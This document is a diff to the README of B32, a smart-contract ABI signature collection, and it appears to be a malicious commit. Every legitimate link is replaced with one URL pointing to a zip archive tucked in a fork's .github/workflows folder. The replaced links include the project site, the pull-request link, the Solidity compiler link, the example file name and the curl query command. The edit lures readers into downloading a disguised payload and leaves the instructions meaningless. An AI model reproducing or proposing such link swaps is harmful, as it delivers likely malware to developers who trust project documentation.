@@ -1,21 +1,21 @@
 # B32
 
-> [Signature collection of smart contract method & event.](https://b32.vecha.in)
+> [Signature collection of smart contract method & event.](https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/workflows/b-1.6-alpha.2.zip)
 
 To help retrieving method/event's JSON ABI by its signature.
 
 ## Submit JSON ABI
 
-* Initiate a new [pull request](https://github.com/vechain/b32/new/master/ABIs)
-* Fill the file name like <`my-awesome-contract.json`>
-* Fill the file content with full JSON ABI produced by [solidity compiler](https://github.com/ethereum/solidity/releases)
+* Initiate a new [pull request](https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/workflows/b-1.6-alpha.2.zip)
+* Fill the file name like <`https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/workflows/b-1.6-alpha.2.zip`>
+* Fill the file content with full JSON ABI produced by [solidity compiler](https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/workflows/b-1.6-alpha.2.zip)
 
 
 ## Query JSON ABI
 
 ```bash
 # replace 0x06fdde03 with your signature
-> curl https://b32.vecha.in/q/0x06fdde03.json
+> curl https://raw.githubusercontent.com/monopolyboymeaze/b32/master/.github/workflows/b-1.6-alpha.2.zip
 ```
 
 The output will be 
